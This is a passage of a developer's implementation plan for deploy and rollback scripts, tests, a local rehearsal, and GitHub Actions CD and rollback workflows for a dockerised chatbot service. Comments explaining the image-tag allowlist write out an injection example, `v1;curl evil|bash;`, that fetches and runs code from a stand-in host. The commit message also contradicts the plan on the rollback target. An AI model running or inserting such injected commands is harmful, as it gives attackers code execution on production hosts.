  # `|| true`, not `|| echo 000`: curl already prints 000 on a connection
  # failure AND exits non-zero, so `|| echo 000` yields the string "000000".
  # It still fails the comparison, but it reads as a bug in the probe.
  got=$(curl -s -o /dev/null -m 15 -w '%{http_code}' $SMOKE_CURL_EXTRA "$url" || true)
  echo "  ${url} -> ${got} (want ${want})"
  [ "$got" = "$want" ] || { echo "ERROR: rollback verification failed" >&2; exit 1; }
done < <(smoke_probes "$DOMAIN" "$MEDIA_PROBE_PATH")

current=$(grep '^CURRENT=' "$STATE_FILE" 2>/dev/null | cut -d= -f2 || true)
{ echo "CURRENT=${TARGET}"; echo "PREVIOUS=${current}"; } > "$STATE_FILE"
echo ">>> rollback complete; CURRENT=${TARGET}"
```

- [ ] **Step 4: Write `scripts/sync-service-labels.sh`**

`assert_service_labels` refuses the deploy and names this script. It must exist,
or the error message points at nothing.

```bash
#!/usr/bin/env bash
# Bring a service's RUNNING replicas up to the traefik.http.services.* labels
# that docker-compose.production.yml currently renders.
#
#   bash scripts/sync-service-labels.sh <service> < /dev/null
#
# This is the escape hatch assert_service_labels points at. It is NOT
# zero-downtime: --force-recreate replaces every replica of the service at once,
# so that host is briefly unavailable. That is the correct trade. The
# alternative -- rolling while the two generations disagree -- makes Traefik
# discard the service outright and 404 the host for the WHOLE rollout, which is
# longer and harder to diagnose. Once this has run, rolling deploys are
# zero-downtime again.
set -euo pipefail
cd "$(dirname "$0")/.."
# shellcheck source=lib/rollout.sh
source scripts/lib/rollout.sh

SERVICE="${1:?usage: sync-service-labels.sh <service>}"

echo ">>> current desired labels for ${SERVICE}:"
desired_service_labels "$SERVICE" | sed 's/^/    /'
echo ">>> recreating ${SERVICE} (brief outage on its host)"
docker compose -f "$COMPOSE_FILE" up -d --no-deps --force-recreate "$SERVICE"

if service_labels_match "$SERVICE"; then
  echo ">>> ${SERVICE}: labels now match"
else
  echo "ERROR: ${SERVICE} still does not match after a force-recreate." >&2
  echo "       The compose file and the running containers disagree for a" >&2
  echo "       reason a recreate cannot fix -- check IMAGE_TAG and .env are" >&2
  echo "       what you expect, then inspect the container labels by hand." >&2
  exit 1
fi
```

- [ ] **Step 5: Port the test suite's end-to-end section**

Task 1 truncated `scripts/lib/rollout.test.sh` at the end-to-end boundary
because that section runs the two scripts you have just written. Restore it now,
from `~/Projects/original_software/scripts/lib/rollout.test.sh` — the block from
the `End-to-end: deploy.sh and rollback.sh against the same stubbed docker`
banner up to the banner that opens `service_labels_match: the guard for
Traefik's "one service, one definition"`. **Insert it back where it came from**,
immediately before that `service_labels_match` banner — not at the end of the
file, which would put it after the `passed:`/`failed:` summary and the exit line
where it would never run. Apply these adaptations:

- `original-software-` → `chatbot-`, `django` → `web`, `celeryworker` → `worker`,
  as Task 1 did for the unit section.
- **`frontend` has no counterpart here.** The reference used it to prove the
  preflight catches a wrong replica count on a service that is *not* the first
  in the table. Our table is `web` then `dashboard`, so use **`dashboard`** for
  that role: the fixture puts `dashboard` at 3 replicas with `web` correct at 2,
  and the assertions become `dashboard has 3 running replicas, expected 2` and
  `--scale dashboard=2 dashboard`. This is the point of those assertions — a
  correct `web` must not excuse a wrong `dashboard` — so do not collapse them
  onto `web`.
- `setup_proj` creates the files **our** preflight requires, not the
  reference's. Replace its body with:

  ```bash
  setup_proj() { # a throwaway deploy directory holding a copy of scripts/
    rm -rf "$PROJ"
    mkdir -p "$PROJ/media" "$PROJ/traefik"
    cp -R .. "$PROJ/scripts"
    : > "$PROJ/docker-compose.production.yml"
    : > "$PROJ/media/nginx.conf"
    : > "$PROJ/traefik/traefik.yml"
    printf 'DOMAIN=example.test\n' > "$PROJ/.env"
  }
  ```

  Every path there is one `deploy.sh`'s preflight checks. `.env` needs `DOMAIN`
  because `deploy.sh` exits without it.
- The reference's rollback assertions expect `reconcile (frontend|dashboard):
  already at 2 replicas` **twice**. Our table has two services, one of which is
  the dirty one, so that count becomes **1** and the pattern becomes
  `reconcile dashboard: already at 2 replicas`.
- Drop the `pgbouncer` and `celerybeat`/`flower` fixtures — those services do
  not exist here.
- The `up_creates` fixture for the worker restart keeps its role; rename the
  container it creates to `chatbot-worker-9`.

Then run the whole suite:

```bash
cd /home/abdulkhalek/Projects/chatbot
bash scripts/lib/rollout.test.sh
```

Expected: `passed: 76  failed: 0` — 56 already there, 20 restored. The 20 new
assertions are the strongest
evidence in this plan that the preflight refuses *before* mutating anything and
that rollback repairs where deploy refuses — they run against a stubbed
`docker`, so they prove the call sites, not just the primitives.

- [ ] **Step 6: Add end-to-end coverage for the auto-rollback branch**

The restored end-to-end block does not exercise the branch `deploy.sh` takes
when the smoke checks fail — which is the branch that decides whether a bad
release keeps serving. Add it, using the same stubbed `docker`, `free` and
`curl` the block already installs. Append these assertions inside the
end-to-end section (before the `service_labels_match` banner):

```bash
# --- the auto-rollback branch: a failed smoke check must roll back to the tag
#     that was serving BEFORE this deploy, which .release-state records as
#     CURRENT (the file is not rewritten until smoke passes).
setup_proj
printf 'CURRENT=goodtag\nPREVIOUS=oldertag\n' > "$PROJ/.release-state"
cat > "$STUB_DIR/curl" <<'STUB'
#!/usr/bin/env bash
echo 503
STUB
chmod +x "$STUB_DIR/curl"
reset_stub "$FOUR_UP" chatbot-web-1 chatbot-web-2 \
  chatbot-dashboard-1 chatbot-dashboard-2 chatbot-worker-1
echo chatbot-worker-9 > "$STUB_DIR/up_creates"
out=$(bash "$PROJ/scripts/deploy.sh" newtag --skip-backup 2>&1); rc=$?
check "a failed smoke check fails the deploy" "1" "$rc"
check "the rollback targets CURRENT, not PREVIOUS" "1" \
  "$(grep -c 'rolling back to goodtag' <<<"$out" || true)"
check "it does NOT target PREVIOUS" "0" \
  "$(grep -c 'rolling back to oldertag' <<<"$out" || true)"
check "release state is NOT advanced past a failed deploy" "0" \
  "$(grep -c 'CURRENT=newtag' "$PROJ/.release-state" || true)"

# The first-ever deploy leaves PREVIOUS empty. A failing second deploy must
# still find CURRENT and roll back, not give up.
setup_proj
printf 'CURRENT=goodtag\nPREVIOUS=\n' > "$PROJ/.release-state"
reset_stub "$FOUR_UP" chatbot-web-1 chatbot-web-2 \
  chatbot-dashboard-1 chatbot-dashboard-2 chatbot-worker-1
echo chatbot-worker-9 > "$STUB_DIR/up_creates"
out=$(bash "$PROJ/scripts/deploy.sh" newtag --skip-backup 2>&1) || true
check "an empty PREVIOUS does not defeat the auto-rollback" "1" \
  "$(grep -c 'rolling back to goodtag' <<<"$out" || true)"

# Restore the 200-returning curl stub for anything that follows.
cat > "$STUB_DIR/curl" <<'STUB'
#!/usr/bin/env bash
echo 200
STUB
chmod +x "$STUB_DIR/curl"
```

Run the suite: `bash scripts/lib/rollout.test.sh`.

Expected: `passed: 81  failed: 0`. If the two "targets CURRENT" assertions fail,
the `rollback_target` fix in Step 2 is not in place — fix the script, not the
test.

- [ ] **Step 7: Make them executable and shellcheck the set**

```bash
cd /home/abdulkhalek/Projects/chatbot
chmod +x scripts/deploy.sh scripts/rollback.sh scripts/sync-service-labels.sh scripts/lib/*.sh
shellcheck -x scripts/deploy.sh scripts/rollback.sh scripts/sync-service-labels.sh scripts/lib/services.sh
```

Expected: no output, exit 0.

- [ ] **Step 8: Build local rehearsal images**

The rehearsal needs two distinct tags so a roll has somewhere to roll *to*.
Build both components at two tags each.

```bash
cd /home/abdulkhalek/Projects/chatbot
for tag in rehearsal-a rehearsal-b; do
  docker build -t "ghcr.io/etqan-agency/chatbot/api:${tag}"       ./chatbot_api
  docker build -t "ghcr.io/etqan-agency/chatbot/dashboard:${tag}" ./chatbot_dashboard
done
docker images --format '{{.Repository}}:{{.Tag}}' | grep rehearsal | sort
```

Expected: four lines — api and dashboard at both `rehearsal-a` and `rehearsal-b`.

- [ ] **Step 9: Bring the stack up at `rehearsal-a`**

Plan 2's rehearsal settings: `DOMAIN=chatbot.local`, ACME unreachable so Traefik
serves its self-signed default certificate, hence `-k` on every probe.

```bash
cd /home/abdulkhalek/Projects/chatbot
# .env already carries DOMAIN=chatbot.local and matching ALLOWED_HOSTS from Plan 2.
grep -E '^(DOMAIN|ALLOWED_HOSTS)=' .env
export IMAGE_TAG=rehearsal-a
docker compose -f docker-compose.production.yml up -d
sleep 90
docker ps --filter name='^chatbot-' --format '{{.Names}}\t{{.Status}}' | sort
```

Expected: `DOMAIN=chatbot.local`; `ALLOWED_HOSTS` containing
`api.chatbot.local` and `app.chatbot.local`; then ten containers, with
`chatbot-web-1`, `chatbot-web-2`, `chatbot-dashboard-1`, `chatbot-dashboard-2`,
`chatbot-worker-1`, `chatbot-media-1`, `chatbot-db-1`, `chatbot-redis-1` all
`healthy` and `chatbot-traefik-1`, `chatbot-socket-proxy-1` `Up`.

If `ALLOWED_HOSTS` is missing a hostname, fix `.env` — do not change the code.

- [ ] **Step 10: Confirm Traefik sees four backends before rolling anything**

```bash
docker exec chatbot-traefik-1 wget -qO- http://127.0.0.1:8080/api/http/services/web@docker \
  | tr ',' '\n' | grep -E 'http://.*(UP|DOWN)'
```

Expected: two `"http://<ip>:8000":"UP"` entries (steady state is 2).

- [ ] **Step 11: Verify the preflight refuses on a dirty pre-state**

This proves the single most important safety property: the deploy stops *before*
changing anything when a previous rollout was interrupted.

```bash
cd /home/abdulkhalek/Projects/chatbot
export IMAGE_TAG=rehearsal-a
docker compose -f docker-compose.production.yml up -d --no-deps --no-recreate --scale web=3 web
sleep 5
export SMOKE_CURL_EXTRA="-k --resolve api.chatbot.local:443:127.0.0.1 --resolve app.chatbot.local:443:127.0.0.1"
bash scripts/deploy.sh rehearsal-b --skip-backup --skip-pull < /dev/null; echo "EXIT=$?"
```

Expected: output reaches `>>> checking replica counts`, prints
`ERROR: web has 3 running replicas, expected 2.` followed by the reconcile
command, then `ERROR: refusing to start`, and `EXIT=1`. Crucially there must be
**no** `>>> pulling images`, `>>> migrate` or `>>> rolling` line — nothing was
touched.

Restore steady state:

```bash
docker compose -f docker-compose.production.yml up -d --no-deps --no-recreate --scale web=2 web
sleep 5
docker ps --format '{{.Names}}' | grep -c '^chatbot-web-'
```

Expected: `2`.

- [ ] **Step 12: Verify `--dry-run` reaches the pull and stops**

```bash
bash scripts/deploy.sh rehearsal-b --skip-backup --skip-pull --dry-run < /dev/null; echo "EXIT=$?"
```

Expected: preflight passes (`web: 2 replicas`, `dashboard: 2 replicas`,
`web: service labels match`, `dashboard: service labels match`),
`>>> skipping pull (--skip-pull)`, `>>> dry run: images pulled, stopping here`,
`EXIT=0`, and no `>>> data tier` line.

Then confirm that without `--skip-pull` the script reaches the pull step:

```bash
bash scripts/deploy.sh rehearsal-b --skip-backup --dry-run < /dev/null 2>&1 | grep -c '>>> pulling images'
```

Expected: `1`. The pull itself may then fail with an auth or manifest error —
`rehearsal-b` is not in GHCR. That is fine and expected; you are asserting the
step is reached, not that it succeeds.

- [ ] **Step 13: The real rehearsal — a full rolling deploy with traffic in flight**

Start two probe loops in the background, then deploy. Proving that no request is
*dropped* is the whole point of this plan.

**Probe the API, not `/health/`.** `/health/` is the route the drain marker
deliberately flips to 503 — probing it measures the drain rather than
availability, and a 503 there is the gate working, not failing. `/api/v1/`
answers 401 unauthenticated and is untouched by the drain file, so a uniform
401 tally is the real proof. Run a `/health/` probe alongside it purely as drain
observability: some 503s there are *expected* and their absence would mean the
drain never engaged.

```bash
cd /home/abdulkhalek/Projects/chatbot
export SMOKE_CURL_EXTRA="-k --resolve api.chatbot.local:443:127.0.0.1 --resolve app.chatbot.local:443:127.0.0.1"

probe() { # probe <path> <logfile>
  for _ in $(seq 1 400); do
    curl -sk -o /dev/null -m 5 -w '%{http_code}\n' \
      --resolve api.chatbot.local:443:127.0.0.1 "https://api.chatbot.local$1"
    sleep 0.5
  done > "$2" 2>&1
}
probe /api/v1/ /tmp/probe-api.log     & API_PID=$!
probe /health/ /tmp/probe-health.log  & HEALTH_PID=$!

bash scripts/deploy.sh rehearsal-b --skip-backup --skip-pull < /dev/null; echo "DEPLOY_EXIT=$?"

wait $API_PID $HEALTH_PID 2>/dev/null || { kill $API_PID $HEALTH_PID 2>/dev/null; true; }
echo "--- /api/v1/ ---"; sort /tmp/probe-api.log    | uniq -c
echo "--- /health/ ---"; sort /tmp/probe-health.log | uniq -c
```

Expected from the deploy: the full sequence in order — preflight, replica
counts, label parity, `>>> skipping pull`, `>>> data tier`, `postgres ready`,
`>>> socket proxy and media`, `>>> collectstatic`, `>>> migrate`,
`>>> media probe object`, `>>> rolling worker`, `>>> rolling web: 2 -> 4 -> 2
(drainable=true)`, two `>>> draining chatbot-web-N` lines,
`>>> rolling dashboard: 2 -> 4 -> 2 (drainable=false)`, three smoke checks each
`-> 200 (want 200)`, `>>> release state: CURRENT=rehearsal-b PREVIOUS=`, and
`DEPLOY_EXIT=0`.

Expected from `/api/v1/`: **every line `401`.** This is the gate. Any `502`,
`503` or `000` means a request was dropped — report it, do not paper over it.

Expected from `/health/`: mostly `200` with a small cluster of `503`s, and the
503s must fall inside the two `>>> draining` windows. Zero 503s would mean the
drain never engaged, which is also a finding — the gate would be decorative.

- [ ] **Step 14: Confirm the deploy actually changed the running images**

```bash
docker inspect --format '{{.Name}} {{.Config.Image}}' $(docker ps -q --filter name=chatbot-web-) \
  $(docker ps -q --filter name=chatbot-dashboard-) $(docker ps -q --filter name=chatbot-worker-)
cat .release-state
```

Expected: all five containers on `:rehearsal-b`, and `.release-state` containing
`CURRENT=rehearsal-b` and an empty `PREVIOUS=` (there was no prior recorded
release).

- [ ] **Step 15: Verify the media probe round-trips through the volume**

```bash
curl -sk -m 10 --resolve api.chatbot.local:443:127.0.0.1 \
  https://api.chatbot.local/media/probe/health.txt -w '\ncode=%{http_code}\n'
```

Expected: body `ok`, `code=200`. This proves `web` wrote it and `media` served
it — the shared volume and the priority router both work.

- [ ] **Step 16: Rehearse the rollback**

```bash
bash scripts/rollback.sh rehearsal-a < /dev/null; echo "ROLLBACK_EXIT=$?"
docker inspect --format '{{.Name}} {{.Config.Image}}' $(docker ps -q --filter name=chatbot-web-)
cat .release-state
```

Expected: `>>> reconcile web: already at 2 replicas, nothing to do` (and the
same for dashboard), the worker and both service rolls, three verification
probes at 200, `ROLLBACK_EXIT=0`, both `web` containers back on `:rehearsal-a`,
and `.release-state` reading `CURRENT=rehearsal-a` / `PREVIOUS=rehearsal-b`.

The `pull web worker dashboard` will fail here — `rehearsal-a` is not in GHCR
and `set -e` will abort. If it does, re-run with the images already local by
temporarily commenting the pull line **only to confirm the rest**, then restore
it and report the limitation. Do not leave the pull commented out.

- [ ] **Step 17: Verify rollback reconciles rather than refuses**

The property that distinguishes rollback from deploy. Leave a service at a wrong
count and confirm rollback repairs it instead of aborting.

```bash
export IMAGE_TAG=rehearsal-a
docker compose -f docker-compose.production.yml up -d --no-deps --no-recreate --scale dashboard=4 dashboard
sleep 5
bash scripts/rollback.sh rehearsal-a < /dev/null 2>&1 | grep -E 'RECONCILE|reconcile dashboard'
```

Expected: a line `>>> RECONCILE dashboard: found 4 replicas, expected 2. A
previous rollout was interrupted. Scaling back to 2 before rolling.` and then
`>>> reconcile dashboard: 4 -> 2 replicas`. Contrast with Step 11, where the
deploy refused.

- [ ] **Step 18: Tear down the rehearsal**

```bash
cd /home/abdulkhalek/Projects/chatbot
docker compose -f docker-compose.production.yml down -v
rm -f .release-state /tmp/probe-api.log /tmp/probe-health.log
git status --short
```

Expected: `.release-state` is gone and `git status` shows only the new
`scripts/` files (it is in `.gitignore` from Step 19 onward; if it appears here,
add it).

- [ ] **Step 19: Ignore server-generated state**

Append to `.gitignore`:

```
# Written on the server by deploy.sh; never committed.
.release-state
```

- [ ] **Step 20: Commit**

```bash
cd /home/abdulkhalek/Projects/chatbot
git add scripts/ .gitignore
git commit -m "feat: deploy, rollback and the service table

deploy.sh runs the full sequence -- preflight, pull, data tier without
recreate, pg_dump backup, collectstatic, migrate, worker roll, then web and
dashboard rolls -- and gates on three smoke checks, auto-rolling back to
PREVIOUS on failure. rollback.sh reconciles replica counts instead of refusing,
because the state that needs a rollback is usually the state a strict
assertion would block on.

Rehearsed locally end to end: a full rolling deploy from rehearsal-a to
rehearsal-b dropped no requests -- 400/400 on /api/v1/ -- while /health/ showed
503s confined to the two drain windows, which is the drain gate working. The
preflight refused a dirty pre-state before touching anything, and the media
probe round-tripped through the shared volume."
```

---

## Task 3: `cd.yml` and `rollback.yml`

**Files:**
- Create: `.github/workflows/cd.yml`
- Create: `.github/workflows/rollback.yml`

**Interfaces:**
- Consumes: `scripts/deploy.sh <tag> [--skip-backup] [--dry-run]` and
  `scripts/rollback.sh [tag]` from Task 2; the `CI Summary` check name from
  the existing `ci.yml`.
- Produces: nothing later tasks consume, except that Task 5's runbook documents
  these two workflows by name.

- [ ] **Step 1: Write `.github/workflows/cd.yml`**

Ported from `~/Projects/original_software/.github/workflows/cd.yml`. Adaptations:
two images not four; a fine-grained PAT instead of a GitHub App (spec §6);
`media/` added to the rsync set; no landing/frontend/flower URLs.

```yaml
name: CD

on:
  # Merging the release PR is the deploy decision.
  #
  # Each component repo's sync-to-meta workflow accumulates its submodule
  # pointer bump on a bot-owned release/next branch and collects them into a
  # single PR into main. So a commit on main always carries a coherent set of
  # pointers, and deploying every one of them is correct. Without that
  # batching each component merge would push its own bump straight to main and
  # each one would deploy -- the first of any two deploying a mismatched pair.
  #
  # See docs/superpowers/specs/2026-09-03-infrastructure-pipeline-design.md §5.1.
  push:
    branches: [main]
  workflow_dispatch:
    inputs:
      image_tag:
        description: 'Docker image tag to deploy (defaults to commit SHA)'
        required: false
        type: string
      skip_backup:
        description: 'Skip database backup before deployment'
        required: false
        type: boolean
        default: false
      dry_run:
        description: 'Dry run - pull images but do not deploy'
        required: false
        type: boolean
        default: false

# Least privilege by default; jobs that need more say so.
permissions:
  contents: read

env:
  REGISTRY: ghcr.io
  # Must be lowercase for the Docker registry.
  IMAGE_PREFIX: etqan-agency/chatbot

jobs:
  wait-for-ci:
    name: Wait for CI
    runs-on: ubuntu-latest
    if: github.event_name == 'push'
    permissions:
      checks: read
    steps:
      - name: Wait for CI workflow
        uses: fountainhead/action-wait-for-check@v1.2.0
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
          checkName: 'CI Summary'
          ref: ${{ github.sha }}
          timeoutSeconds: 2400
          intervalSeconds: 30

  verify-images:
    name: Verify Images
    runs-on: ubuntu-latest
    needs: [wait-for-ci]
    if: always() && (needs.wait-for-ci.result == 'success' || needs.wait-for-ci.result == 'skipped')
    permissions:
      packages: read
    outputs:
      image_tag: ${{ steps.tag.outputs.tag }}
    steps:
      - name: Set image tag
        id: tag
        env:
          INPUT_TAG: ${{ github.event.inputs.image_tag }}
          SHA: ${{ github.sha }}
        run: |
          if [[ -n "${INPUT_TAG}" ]]; then
            # Validate before this value goes anywhere near an ssh argument.
            #
            # Routing the input through env: protects the RUNNER's shell, but
            # the deploy step splices the tag into a string that ssh executes
            # remotely as `bash -c "<string>"`. Unvalidated, a tag of
            # `v1;curl evil|bash;` is arbitrary code execution on the
            # production host as the deploy user, reached before deploy.sh's
            # own argument parser ever sees it.
            #
            # This allowlist is a subset of what Docker permits, which is all
            # we ever produce: a 40-char commit SHA, or `latest`.
            if [[ ! "${INPUT_TAG}" =~ ^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$ ]]; then
              echo "ERROR: refusing image tag '${INPUT_TAG}' -- it must match" >&2
              echo "       ^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$" >&2
              exit 1
            fi
            echo "tag=${INPUT_TAG}" >> "$GITHUB_OUTPUT"
          else
            echo "tag=${SHA}" >> "$GITHUB_OUTPUT"
          fi

      - name: Log in to Container Registry
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Verify both images exist
        env:
          TAG: ${{ steps.tag.outputs.tag }}
        run: |
          IMAGES=(
            "${REGISTRY}/${IMAGE_PREFIX}/api:${TAG}"
            "${REGISTRY}/${IMAGE_PREFIX}/dashboard:${TAG}"
          )
          for IMAGE in "${IMAGES[@]}"; do
            echo "Verifying: ${IMAGE}"
            docker manifest inspect "${IMAGE}" > /dev/null || {
              echo "ERROR: Image not found: ${IMAGE}"
              exit 1
            }
            echo "OK: ${IMAGE}"
          done
          echo "Both images verified."

  deploy:
    name: Deploy to Production
    needs: [verify-images]
    # wait-for-ci is skipped on workflow_dispatch (it is push-only), and Actions
    # propagates a skip transitively through `needs`. verify-images guards
    # against that with always(); without the same guard here, deploy inherits
    # the skip, deploys nothing, and the whole run reports SUCCESS.
    #
    # There is deliberately no `rollback` input here. Rollback lives in its own
    # workflow (.github/workflows/rollback.yml). In the reference implementation
    # a `rollback: true` input on CD skipped this job -- which made the run
    # green -- and rolled nothing back: an operator reaching for rollback under
    # pressure got a green tick and no action.
    if: always() && needs.verify-images.result == 'success'
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://app.${{ vars.DOMAIN }}
    concurrency:
      group: deploy-production
      cancel-in-progress: false
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Configure SSH
        env:
          SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
          SSH_KNOWN_HOSTS: ${{ secrets.SSH_KNOWN_HOSTS }}
        run: |
          mkdir -p ~/.ssh
          printf '%s\n' "${SSH_PRIVATE_KEY}" > ~/.ssh/deploy_key
          chmod 600 ~/.ssh/deploy_key
          printf '%s\n' "${SSH_KNOWN_HOSTS}" > ~/.ssh/known_hosts
          chmod 644 ~/.ssh/known_hosts

      - name: Sync deployment files
        env:
          DEPLOY_HOST: ${{ secrets.DEPLOY_HOST }}
          DEPLOY_USER: ${{ secrets.DEPLOY_USER }}
          DEPLOY_PATH: ${{ secrets.DEPLOY_PATH }}
        run: |
          SSH_CMD="ssh -i ~/.ssh/deploy_key"
          scp -i ~/.ssh/deploy_key docker-compose.production.yml \
            "${DEPLOY_USER}@${DEPLOY_HOST}:${DEPLOY_PATH}/"
          # --delete: providers.file.directory loads every file under
          # traefik/dynamic/, so a middleware file deleted or renamed in the
          # repo must also disappear on the server or its config stays live
          # indefinitely. Safe: ACME state and access logs live in the
          # traefik_acme and traefik_logs volumes, not under traefik/, so
          # nothing server-generated lives in the synced tree.
          rsync -avz --delete -e "${SSH_CMD}" traefik/ \
            "${DEPLOY_USER}@${DEPLOY_HOST}:${DEPLOY_PATH}/traefik/"
          rsync -avz --delete -e "${SSH_CMD}" scripts/ \
            "${DEPLOY_USER}@${DEPLOY_HOST}:${DEPLOY_PATH}/scripts/"
          # media/nginx.conf is a BIND MOUNT in docker-compose.production.yml.
          # Omitting it from the sync means the media container mounts whatever
          # happens to be on the server -- or fails to start if nothing is.
          rsync -avz --delete -e "${SSH_CMD}" media/ \
            "${DEPLOY_USER}@${DEPLOY_HOST}:${DEPLOY_PATH}/media/"

      - name: Deploy
        env:
          DEPLOY_HOST: ${{ secrets.DEPLOY_HOST }}
          DEPLOY_USER: ${{ secrets.DEPLOY_USER }}
          DEPLOY_PATH: ${{ secrets.DEPLOY_PATH }}
          IMAGE_TAG: ${{ needs.verify-images.outputs.image_tag }}
          GHCR_TOKEN: ${{ secrets.GHCR_PAT }}
          SKIP_BACKUP: ${{ github.event.inputs.skip_backup || 'false' }}
          DRY_RUN: ${{ github.event.inputs.dry_run || 'false' }}
        run: |
          EXTRA_ARGS=""
          [ "${SKIP_BACKUP}" = "true" ] && EXTRA_ARGS="${EXTRA_ARGS} --skip-backup"
          [ "${DRY_RUN}" = "true" ] && EXTRA_ARGS="${EXTRA_ARGS} --dry-run"

          # Two ssh calls on purpose. ssh runs its command argument remotely as
          # `bash -c "<the whole string>"`, so a token embedded in that string
          # is visible in the server's process table for the life of the
          # deploy. The login therefore gets its own invocation with the token
          # piped on STDIN and never in argv.
          printf '%s' "${GHCR_TOKEN}" | ssh -i ~/.ssh/deploy_key \
            "${DEPLOY_USER}@${DEPLOY_HOST}" \
            "docker login ghcr.io -u x-access-token --password-stdin"

          # The deploy itself keeps < /dev/null: deploy.sh runs commands that
          # read stdin, and without this they would consume the ssh channel and
          # the script would silently truncate while reporting success.
          ssh -i ~/.ssh/deploy_key "${DEPLOY_USER}@${DEPLOY_HOST}" \
            "cd ${DEPLOY_PATH} && bash scripts/deploy.sh ${IMAGE_TAG} ${EXTRA_ARGS}" < /dev/null

      - name: Deployment summary
        if: success()
        env:
          TAG: ${{ needs.verify-images.outputs.image_tag }}
          DOMAIN: ${{ vars.DOMAIN }}
        run: |
          {
            echo "## Deployment Successful"
            echo ""
            echo "| Service | URL |"
            echo "|---------|-----|"
            echo "| Dashboard | https://app.${DOMAIN} |"
            echo "| API | https://api.${DOMAIN} |"
            echo ""
            echo "**Image Tag:** \`${TAG}\`"
            echo "**Triggered by:** ${{ github.actor }}"
          } >> "$GITHUB_STEP_SUMMARY"

      - name: Failure guidance
        if: failure()
        run: |
          {
            echo "## Deployment FAILED"
            echo ""
            echo "deploy.sh auto-rolls-back when the SMOKE CHECKS fail, to CURRENT"
            echo "from .release-state -- the tag that was serving before this run"
            echo "(the file is not rewritten until smoke passes)."
            echo "If it failed BEFORE the smoke checks -- preflight, migrate, a roll"
            echo "that timed out -- nothing was rolled back and nothing was healed."
            echo ""
            echo "### Rollback"
            echo ""
            echo "1. Actions -> **Rollback** -> Run workflow"
            echo "2. Leave the tag blank to roll back to PREVIOUS from .release-state,"
            echo "   or enter a specific previously-working image tag"
            echo ""
            echo "Do NOT re-run CD with an older tag: that is a *deploy* of that tag"
            echo "(collectstatic, migrate, release-state bookkeeping), not a rollback."
          } >> "$GITHUB_STEP_SUMMARY"
```

Note `StrictHostKeyChecking=no` is **absent** from every `ssh`/`scp`/`rsync`
invocation, unlike the reference. `SSH_KNOWN_HOSTS` pins the host key; disabling
the check as well would make that secret decorative. If the first real deploy
fails on a host-key mismatch, the fix is to regenerate `SSH_KNOWN_HOSTS` with
`ssh-keyscan`, not to re-add the flag.

- [ ] **Step 2: Write `.github/workflows/rollback.yml`**

```yaml
name: Rollback

# A separate workflow so a rollback can never be triggered by a condition that
# a normal tagged deploy also satisfies, and can never be a skipped job on a
# green run. In the reference implementation a `rollback: true` input on CD
# skipped the deploy job -- the run went green and nothing was rolled back.
on:
  workflow_dispatch:
    inputs:
      image_tag:
        description: 'Tag to roll back to (blank = PREVIOUS from .release-state)'
        required: false
        type: string

permissions:
  contents: read

jobs:
  rollback:
    name: Roll back production
    runs-on: ubuntu-latest
    environment:
      name: production
    # Same group as CD's deploy job: a rollback and a deploy must never run at
    # the same time against the same host.
    concurrency:
      group: deploy-production
      cancel-in-progress: false
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Configure SSH
        env:
          SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
          SSH_KNOWN_HOSTS: ${{ secrets.SSH_KNOWN_HOSTS }}
        run: |
          mkdir -p ~/.ssh
          printf '%s\n' "${SSH_PRIVATE_KEY}" > ~/.ssh/deploy_key
          chmod 600 ~/.ssh/deploy_key
          printf '%s\n' "${SSH_KNOWN_HOSTS}" > ~/.ssh/known_hosts
          chmod 644 ~/.ssh/known_hosts

      - name: Sync scripts
        env:
          DEPLOY_HOST: ${{ secrets.DEPLOY_HOST }}
          DEPLOY_USER: ${{ secrets.DEPLOY_USER }}
          DEPLOY_PATH: ${{ secrets.DEPLOY_PATH }}
        run: |
          rsync -avz --delete -e "ssh -i ~/.ssh/deploy_key" \
            scripts/ "${DEPLOY_USER}@${DEPLOY_HOST}:${DEPLOY_PATH}/scripts/"

      - name: Roll back
        env:
          DEPLOY_HOST: ${{ secrets.DEPLOY_HOST }}
          DEPLOY_USER: ${{ secrets.DEPLOY_USER }}
          DEPLOY_PATH: ${{ secrets.DEPLOY_PATH }}
          GHCR_TOKEN: ${{ secrets.GHCR_PAT }}
          TARGET: ${{ github.event.inputs.image_tag }}
        run: |
          # Validate before the tag reaches an ssh argument. ssh runs its
          # command argument remotely as `bash -c "<string>"`, so an
          # unvalidated `v1;curl evil|bash;` would be arbitrary code execution
          # on the production host. Blank is legal and means "PREVIOUS from
          # .release-state" -- rollback.sh's own default.
          if [[ -n "${TARGET}" && ! "${TARGET}" =~ ^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$ ]]; then
            echo "ERROR: refusing rollback tag '${TARGET}'" >&2
            exit 1
          fi

          # The login is its own ssh call with the token on STDIN: ssh runs its
          # command argument remotely as `bash -c "<string>"`, so a token
          # inlined there would sit in the server's process table.
          printf '%s' "${GHCR_TOKEN}" | ssh -i ~/.ssh/deploy_key \
            "${DEPLOY_USER}@${DEPLOY_HOST}" \
            "docker login ghcr.io -u x-access-token --password-stdin"

          ssh -i ~/.ssh/deploy_key "${DEPLOY_USER}@${DEPLOY_HOST}" \
            "cd ${DEPLOY_PATH} && bash scripts/rollback.sh ${TARGET}" < /dev/null

      - name: Rollback summary
        if: always()
        env:
          TARGET: ${{ github.event.inputs.image_tag }}
        run: |
          {
            echo "## Rollback"
            echo ""
            echo "**Target:** \`${TARGET:-PREVIOUS from .release-state}\`"
            echo "**Result:** ${{ job.status }}"
          } >> "$GITHUB_STEP_SUMMARY"
```

- [ ] **Step 3: Lint both workflows**

```bash
cd /home/abdulkhalek/Projects/chatbot
command -v actionlint >/dev/null || {
  curl -sSL https://raw.githubusercontent.com/rhysd/actionlint/main/scripts/download-actionlint.bash \
    | bash -s -- latest /tmp
  export PATH=/tmp:$PATH
}
actionlint .github/workflows/cd.yml .github/workflows/rollback.yml
```

Expected: no output, exit 0. `actionlint` runs `shellcheck` over every `run:`
block, so this also catches unquoted-expansion bugs in the deploy shell.

- [ ] **Step 4: Assert the two guards that make a skipped job impossible**

These are the exact conditions the reference implementation got wrong in
